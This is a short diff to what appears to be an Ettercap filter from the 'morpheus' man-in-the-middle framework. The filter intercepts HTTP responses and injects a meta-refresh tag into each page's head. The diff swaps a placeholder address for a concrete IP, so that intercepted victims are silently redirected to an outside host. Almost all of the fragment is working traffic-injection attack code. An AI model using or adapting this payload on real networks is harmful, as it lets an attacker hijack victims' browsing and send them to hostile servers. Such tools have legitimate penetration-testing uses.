@@ -35,8 +35,8 @@ if (ip.proto == TCP && tcp.src == 80){
    msg("[morpheus] | dns_spoof: %1\n");
 
     # redirect target to exploitdb by replacing <head> html tag with one redirection url
-    replace("<HEAD>", "<HEAD><META http-equiv='refresh' content='0;URL=https://IpAdR'>");
-    replace("<head>", "<head><meta http-equiv='refresh' content='0;URL=https://IpAdR'>");
+    replace("<HEAD>", "<HEAD><META http-equiv='refresh' content='0;URL=https://31.192.120.44'>");
+    replace("<head>", "<head><meta http-equiv='refresh' content='0;URL=https://31.192.120.44'>");
   }
 }
 
